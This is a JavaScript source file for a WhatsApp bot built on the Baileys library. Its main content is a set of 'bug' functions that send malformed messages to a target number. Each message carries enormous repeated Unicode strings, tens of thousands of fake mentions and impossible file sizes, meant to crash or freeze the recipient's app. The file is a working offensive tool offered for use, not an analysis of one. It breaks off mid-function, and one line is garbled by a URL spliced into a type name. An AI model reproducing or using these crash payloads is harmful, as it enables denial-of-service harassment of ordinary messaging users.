require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMehttps://whatsapp.com/channel/0029VanRJcU7NoaADR1oyb2vssage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? sock.user.id.split(":")[0] + "@s.whatsapp.net" || sock.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = [".", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await sock.decodeJid(sock.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Time
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

async function dilxzreply(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️",
newsletterJid: "120363330289360382@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
body: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
previewType: "VIDEO",
thumbnailUrl: "https://files.catbox.moe/j17olw.jpg", 
sourceUrl: "https://youtube.com",  
},
},
text: teks,
};
return sock.sendMessage(m.chat, nedd, {quoted: catalems,});
}
const catalems = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast",
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: "",
      itemCount: "2010",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==",
    },
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  },
};
const catalems2 = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6289506368777:+6289506368777\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const bugres = 'Sending bug process....'
const ryclol = ["https://files.catbox.moe/j17olw.jpg"]
//function
function randomNumber() {
const digits = [];
while (digits.length < 6) {
const randomDigit = Math.floor(Math.random() * 10);
if (!digits.includes(randomDigit)) {
digits.push(randomDigit);
}
}
return digits.join("");
}
    
// function bug //
async function invicXblank(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "ោ៝".repeat(100000),
      caption: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "ោ៝".repeat(100000),
      jpegThumbnail: null
    }
  };
  await sock.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function VampNewCrash(target, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "",
              serverMessageId: 1,
              newsletterName: "",
            },
          },
          description: '\u0003',
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "‌" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function DocxSystemUi(target) {
    try {
        const documentMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/11923856_1474185146798290_6048054041675266856_n.enc?ccb=11-4&oh=01_Q5Aa1gGK5NXiXioJlvQ8QU3BT5oshVKOXjEPT4EUSbNFo4IkIQ&oe=686B0FA7&_nc_sid=5e03e0&mms3=true",
            title: "\u0003".repeat(900000000),
            fileSha256: "tJxI2OsQ2EwgEIcTNo8DLmYcKvYPrYDfxxbIpvmczfU=",
            mediaKey: "89tK2gWWAKun8dxalKD7WO5e3SE1GF7pIdwbh6prkxw=",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileName: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
            fileEncSha256: "3e4rMVkvA+g47xtcIm16hHnDrTk5efdFNjuXpcMfzgo=",
            directPath: "/v/t62.7119-24/11923856_1474185146798290_6048054041675266856_n.enc?ccb=11-4&oh=01_Q5Aa1gGK5NXiXioJlvQ8QU3BT5oshVKOXjEPT4EUSbNFo4IkIQ&oe=686B0FA7&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 1, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            contactVcard: false,
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                        {
                            length: 40000,
                        },
                        () =>
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                ]
            }
        }

        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { documentMessage } }
        }, {});

        await sock.relayMessage(target, msg.message, { participants: { jid: target }, messageId: msg.key.id });
    } catch (err) {
    }
}

async function CursorCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "1649999999089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ"
                },
                footer: {
                  text: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function LocUiNew(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "", 
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function letterCrash(target, Ptcp = true) {
  let virtex = "___" + "ꦾ".repeat(77777) + "@1".repeat(77777);
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `@newsletter`,
          newsletterName: virtex,
          jpegThumbnail: "",
          caption: virtex,
          inviteExpiration: Date.now() + 1814400000
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          groupMentions: [
            {
              groupJid: `120363319314627296@newsletter`,
              groupSubject: virtex
            }
          ]
        }
      }
    }
  }), {
    userJid: target
  });

  await sock.relayMessage(target, messageContent.message, {
    participant: { jid: target },
    messageId: messageContent.key.id
  });
}

async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
